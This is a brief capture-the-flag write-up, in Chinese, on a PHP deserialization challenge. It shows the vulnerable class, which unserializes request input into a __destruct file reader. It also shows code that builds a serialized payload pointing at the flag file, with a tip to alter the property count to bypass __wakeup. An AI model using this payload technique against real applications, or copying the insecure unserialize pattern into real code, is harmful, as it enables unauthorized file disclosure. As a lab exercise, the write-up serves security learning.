#PHP序列化 
```php
<?php
class X
{
    public $x = __FILE__;
    function __construct($x)
    {
        $this->x = $x;
    }
    function __wakeup()
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()
    {
        highlight_file($this->x);
        //flag is in fllllllag.php
    }
}
if (isset($_REQUEST['x'])) {
    @unserialize($_REQUEST['x']);
} else {
    highlight_file(__FILE__);
}

```

payload:
```php
<?php
class X
{
    public $x;
    function __construct($x)
    {
        $this->x = $x;
    }
}
$b = 'fllllllag.php';
$a = new X($b);

echo serialize($a);
//O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}
```
最后再修改属性个数绕过 `__wakeup` 